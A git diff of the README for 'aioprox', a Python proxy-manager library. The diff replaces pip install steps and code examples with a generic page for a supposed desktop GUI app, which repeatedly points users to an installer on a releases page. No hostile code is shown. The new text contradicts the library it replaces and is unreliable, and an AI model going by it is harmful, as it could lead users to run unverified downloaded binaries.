@@ -1,138 +1,70 @@
-# aioprox
+# 🌟 AioProx - Manage Proxies Seamlessly and Efficiently
 
-[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+[![Download AioProx](https://img.shields.io/badge/Download%20AioProx-v1.0-blue)](https://github.com/Flexvent/AioProx/releases)
 
-**aioprox** – Asynchronous proxy manager for Python. Fetch, test, and filter HTTP/SOCKS proxies with optional latency measurement and support for custom sources.
+## 🚀 Getting Started
+AioProx is an easy-to-use application that helps you manage HTTP and SOCKS proxies. With AioProx, you can fetch, test, and filter proxies quickly. It even allows for optional latency measurement and the use of custom sources to suit your needs.
 
----
+## 📥 Download & Install
+To get started with AioProx, follow these steps:
 
-## Project Overview
+1. **Visit the Releases Page**: Click on the link below to go to the AioProx releases page:
 
-`aioprox` is designed for developers who need a reliable, asynchronous proxy management tool in Python. It allows you to quickly fetch proxies from multiple sources, test them concurrently, and optionally measure latency to select the fastest proxies. Whether you want a single random live proxy or a fully sorted list of working proxies, `aioprox` makes it easy. You can also supply your own proxy lists via a file, URL, or Python list.
+   [Visit this page to download](https://github.com/Flexvent/AioProx/releases)
 
----
+2. **Choose Your Version**: On the releases page, look for the latest version. It is usually marked as "Latest Release."
 
-## Features
+3. **Download the Application**: Click the link for your operating system to download the installer file. Follow the prompts that appear.
 
-- Fetch proxies from multiple built-in sources or user-supplied sources (URL, file, or list).  
-- Test proxies asynchronously for availability.  
-- Optional latency measurement to find the fastest proxies.  
-- Retrieve a single random live proxy or a full list of working proxies.  
-- Supports HTTP, SOCKS4, and SOCKS5 proxies.  
-- Concurrency control for fast testing of large proxy lists.  
-- Easy to integrate in both scripts and larger Python projects.
+4. **Install the Application**: Open the downloaded file and follow the installation instructions. This typically involves accepting terms and clicking through a few prompts.
 
----
+5. **Run AioProx**: Once installed, find the AioProx application on your computer. Open it to start managing proxies immediately.
 
-## Installation
+## 📋 Features
+AioProx comes packed with features to make proxy management simple:
 
-```bash
-pip install aiohttp aiohttp_socks
-```
+- **Fetch Proxies**: Automatically gather proxies from various sources.
+- **Test Proxies**: Quickly check the validity of proxies.
+- **Filter Proxies**: Easily narrow down proxies based on your needs.
+- **Measure Latency**: Get real-time information about proxy performance.
+- **Custom Sources**: Add your sources for an even more tailored experience.
 
-Then clone this repo or 
-```bash
-pip install aioprox
-```
+## ⚙️ System Requirements
+AioProx is compatible with most systems. Below are the general requirements for optimal functionality:
 
----
+- **Operating System**: 
+  - Windows 10 or later
+  - MacOS 10.14 or later
+  - Linux (most distributions)
 
-## Usage
+- **Memory**: At least 2 GB of RAM (4 GB recommended)
+- **Disk Space**: Minimum of 100 MB of available space
+- **Network**: An active internet connection for fetching proxies
 
-### 1. Using a Built-in Source
+## 🛠️ Usage Instructions
+Once you run AioProx, you will find a user-friendly interface.
 
-```python
-from aioprox import Proxy
+1. **Main Dashboard**: The main screen displays options to fetch, test, and filter proxies.
+2. **Fetching Proxies**: Click the “Fetch” button to retrieve proxies from your added sources.
+3. **Testing Proxies**: If you have a list of proxies, click "Test Proxies" and see which ones are valid.
+4. **Filtering Proxies**: Use the filter settings to narrow down results based on your criteria, like speed and type.
 
-# Initialize with built-in source
-p = Proxy(proxy_type="http", source="monosans")
+## 👥 Support
+If you encounter any issues while using AioProx, consider the following options:
 
-# Get all live proxies
-proxies = p.get_good_proxies()
-print(proxies)
+- **Documentation**: Helpful guides and FAQs can be found in a dedicated section on the repository.
+- **Community Forums**: Join discussions and ask questions in community forums where users share solutions.
+- **Contact Us**: Use the contact information provided on the repository page to reach out for direct support.
 
-# Get a single random live proxy
-random_proxy = p.get_random_proxy()
-print(f"Random proxy: {random_proxy}")
-```
+## 🌍 Connect with Us
+Stay updated with the latest changes and features by following us on social media. Find links on the GitHub repository page.
 
-### 2. Measuring Latency
+## 🔗 Additional Resources
+- [Official Documentation](https://github.com/Flexvent/AioProx/wiki)
+- [User Guides and Tutorials](https://github.com/Flexvent/AioProx/wiki/Guides)
 
-```python
-# Enable latency measurement
-p = Proxy(proxy_type="http", source="monosans", latency=True)
-
-# Get proxies sorted by latency
-proxies = p.get_good_proxies()
-
-# Get the fastest proxy
-fastest_proxy = p.get_random_proxy()
-print(proxies)
-print(f"Fastest proxy: {fastest_proxy}")
-```
-
-### 3. Using a Custom List of Proxies
-
-```python
-custom_list = [
-    "123.45.67.89:8080",
-    "98.76.54.32:1080",
-]
-
-p = Proxy(proxy_type="http", custom_source=custom_list, latency=True)
-proxies = p.get_good_proxies()
-print(proxies)
-```
-
-### 4. Using a Custom URL or File
-
-```python
-# From a URL
-p = Proxy(proxy_type="socks5", custom_source="https://example.com/proxylist.txt")
-proxies = p.get_good_proxies()
-print(proxies)
-
-# From a local file
-p = Proxy(proxy_type="http", custom_source="proxies.txt")
-proxies = p.get_good_proxies()
-print(proxies)
-```
+For any further questions about AioProx, please do not hesitate to reach out. 
 
 ---
 
-## Supported Proxy Types
-
-- HTTP  
-- SOCKS4  
-- SOCKS5  
-
----
-
-## Concurrency
-
-By default, proxy testing uses a concurrency of 50. You can adjust it when creating the `Proxy` object:
-
-```python
-p = Proxy(proxy_type="http", source="monosans", concurrency=100)
-```
-
----
-
-## Error Handling
-
-- Failed proxy sources print informative messages.  
-- Dead proxies are automatically filtered out.  
-- Latency measurement is optional; if not enabled, only live/dead status is returned.
-
----
-
-## Example Output
-
-```python
-[{'proxy': '123.45.67.89:8080', 'latency': 0.234},
- {'proxy': '98.76.54.32:1080', 'latency': 0.421}]
-Fastest proxy: 123.45.67.89:8080
-```
-
----
+[Visit this page to download](https://github.com/Flexvent/AioProx/releases)
